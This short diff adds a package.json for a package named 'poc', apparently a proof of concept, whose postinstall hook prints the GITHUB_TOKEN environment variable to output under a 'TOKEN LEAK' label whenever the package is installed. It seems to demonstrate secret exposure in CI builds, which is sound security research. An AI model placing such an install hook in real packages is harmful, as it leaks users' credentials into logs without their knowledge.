@@ -1,0 +1,7 @@
+{
+  "name": "poc",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "echo '🔴 TOKEN LEAK:' $GITHUB_TOKEN"
+  }
+}
